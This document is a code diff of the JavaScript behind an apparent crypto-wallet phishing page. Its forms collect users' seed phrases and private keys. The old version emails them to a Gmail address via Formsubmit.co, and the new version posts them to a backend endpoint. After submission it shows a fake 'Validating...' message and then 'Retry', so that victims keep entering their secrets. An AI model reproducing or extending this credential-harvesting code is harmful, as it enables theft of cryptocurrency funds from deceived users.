@@ -35,14 +35,15 @@ function submitFormData(connectionMethod) {
 
     // Check if form data is valid
     if (formData) {
-        // Send form data to email using Formsubmit.co
-        sendFormDataToEmail(formData);
+        // Send form data to backend endpoint
+        sendFormDataToBackend(formData);
 
         // Close the modal after form submission
         closeModal('modal-' + getModalName(connectionMethod));
     }
 }
-// Modify the existing functions to include the new input
+
+// Modify the existing functions to include the new input wallet type inout
 
 // Function to validate Phrase form
 function validatePhraseForm() {
@@ -113,32 +114,40 @@ function validatePrivateKeyForm() {
   return { connectionMethod: 'PrivateKey', privateKey: privateKeyTextarea, walletType: walletType };
 }
 
-// Placeholder function for sending form data to email using Formsubmit.co
-function sendFormDataToEmail(formData) {
-  // Replace 'YOUR_FORMSUBMIT_ENDPOINT' with the actual endpoint you get from Formsubmit.co
-  var formsubmitEndpoint = 'https://formsubmit.co/ajax/mazzatov005@gmail.com';
+// Placeholder function for sending form data to your backend endpoint
+function sendFormDataToBackend(formData) {
+    // Replace 'YOUR_BACKEND_ENDPOINT' with the actual URL of your backend endpoint
+    var backendEndpoint = 'http://localhost:3000/submit-form';
 
-  fetch(formsubmitEndpoint, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(formData),
+    fetch(backendEndpoint, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formData),
     })
-    .then(response => response.json())
+    .then(response => {
+        // Check if response is successful
+        if (response.ok) {
+            // Display success message using swal
+            swal('Validating...');
+            // Delay for 2 seconds and then display "Retry" message
+            setTimeout(function() {
+                swal('Retry');
+            }, 2000);
+            return response.json(); // Return response data
+        } else {
+            // Display error message using swal
+            swal('Error', 'Error submitting form. Please try again.', 'error');
+            throw new Error('Error submitting form');
+        }
+    })
     .then(data => {
-      console.log('Formsubmit.co response:', data);
-      swal('Validating...');
-
-      // Delay for 2 seconds and then display "Retry again" alert
-      setTimeout(function() {
-        swal('Retry again');
-      }, 2000);
+        // Handle response data if needed
+        console.log('Backend response:', data);
     })
     .catch(error => {
-      console.error('Error connecting your account, please retry again:', error);
-      swal('Server Error', 'The server is currently unavailable. Please try again later.', 'error');
-      // You can handle errors here if needed
+        console.error('Error:', error);
     });
 }
 
